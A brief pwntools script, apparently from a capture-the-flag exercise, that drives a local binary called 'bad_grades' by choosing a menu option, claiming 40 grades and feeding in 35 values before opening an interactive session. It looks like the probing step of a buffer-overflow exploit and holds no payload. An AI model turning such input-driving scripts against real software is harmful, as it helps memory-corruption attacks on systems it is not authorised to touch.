from pwn import *

io = process("./bad_grades")
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b": ", b"40")

for _ in range(35):
    io.sendlineafter(b": ", b"1")
io.interactive()
